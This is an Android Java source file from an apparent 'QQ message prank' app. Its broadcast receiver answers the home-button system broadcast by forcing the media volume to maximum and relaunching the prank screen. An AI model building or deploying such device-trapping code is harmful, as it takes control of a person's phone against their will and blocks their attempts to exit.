package com.johnson.qqmessageprank;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.util.Log;

public class HomeWatcherReceiver extends BroadcastReceiver {
    public HomeWatcherReceiver() {
    }
    private static final String LOG_TAG = "HomeReceiver";
    private static final String SYSTEM_DIALOG_REASON_KEY = "reason";
    private AudioManager audioManager;
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.i(LOG_TAG, "onReceive: action: " + action);

            // android.intent.action.CLOSE_SYSTEM_DIALOGS
            audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            int maxvolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxvolume, AudioManager.FLAG_PLAY_SOUND);
            Intent i = new Intent(context, PrankGuid.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);


    }

}

